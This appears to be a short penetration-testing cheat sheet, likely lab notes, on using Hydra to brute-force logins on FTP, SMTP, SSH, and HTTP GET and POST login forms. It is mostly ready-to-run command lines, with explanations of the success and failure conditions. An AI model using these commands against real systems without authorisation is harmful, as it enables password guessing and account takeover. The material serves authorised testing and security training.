#### Command Usage
```
hydra -L <user_list> -P <password_list> <target> <service>
```

#### FTP
```
hydra -l ftp -P password.lst ftp://IP
```

#### SMTP
```
hydra -l email@company.com -P password.lst smtp://IP -v

# For port 465
hydra -l email@company.com -P password.lst -s 465 -S IP smtp 
```

#### SSH
```
hydra -L user.lst -P password.lst ssh://IP -v
```

#### HTTP login pages
**GET Request**
```
hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```
- `http-get-form:` type of HTTP request, can be either **http-get-form** or **http-post-form**.
- `:` Next, we need to split the URL, path, and conditions
- `login-get/index.php:` path of the login page
- `username=^USER^&password=^PASS^:` parameters to brute-force
- `-f:` to stop the brute-forcing attacks after finding a valid username and password

The following section is important to eliminate false positives by specifying the 'failed' condition with F=.

And success conditions, S=. You will have more information about these conditions by analysing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set F=Invalid Password.

Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.

**POST Request**
```
hydra -l burgess -P post.lst 10.10.x.x http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```